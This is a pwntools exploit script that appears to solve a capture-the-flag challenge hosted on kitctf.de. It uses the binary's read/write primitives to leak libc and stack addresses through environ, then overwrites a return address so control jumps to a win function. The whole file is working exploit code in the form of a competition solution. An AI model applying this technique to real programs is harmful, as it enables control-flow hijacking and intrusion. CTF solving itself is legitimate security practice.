from pwn import *

io = process("./nasa")
# io = remote("elmwood-of-intense-commerce.gpn23.ctf.kitctf.de", "443", ssl=True)
# io = remote("oldcreek-of-catastrophic-opportunity.gpn23.ctf.kitctf.de", "443", ssl=True)

write_addr = int(io.recvline()[2:-1], 16) + 0xd8
option_addr = write_addr - 0xd8
win_addr = int(io.recvline()[2:-1], 16)

# gdb.attach(io, api=True, gdbscript="""
# b *main - 0x1376 + 0x16be
# """)

print(f'')
print(f'write_addr: {hex(write_addr)}')
print(f'option_addr: {hex(option_addr)}')
print(f'{hex(win_addr)}')
print(f'{hex(win_addr - 0x1309 + 0x101a)}')

def write(addr, val):
  io.sendline(b'1')
  io.sendline(f'{hex(addr)} {hex(val)}'.encode())

def read(addr):
  io.sendline(b'2')
  io.sendlineafter(b'8-byte adress to read please (hex)\n', f'{hex(addr)}'.encode())
  return int(io.recvline().strip(), 16)

io.recvline()
leak_libc = read(win_addr - 0x1309 + 0x4340) - (0x7a3ee44044e0 - 0x7a3ee4ce4000)
environ = leak_libc + 0x7a3ee440ad58 - 0x7a3ee4ce4000
leak_stack = read(environ)
print(f'leak_libc: {hex(leak_libc)}')
print(f'leak_stack: {hex(leak_stack)}')

write_addr = leak_stack + 0x7ffe07a816c8 - 0x7ffe07a817f8
print(f'write_addr: {hex(write_addr)}')


# write(option_addr, option_addr)
# write(write_addr - 8, option_addr - 0xf8)
write(write_addr, win_addr - 0x1309 + 0x101a) # ret
write(write_addr + 8, win_addr)


# write(write_addr + 0x7ffffc5fca78 - 0x7ffffc5fcb78, win_addr)

io.sendline(b'3')
io.interactive()

# 0x7ffffc5fca78 - 0x7ffffc5fcb78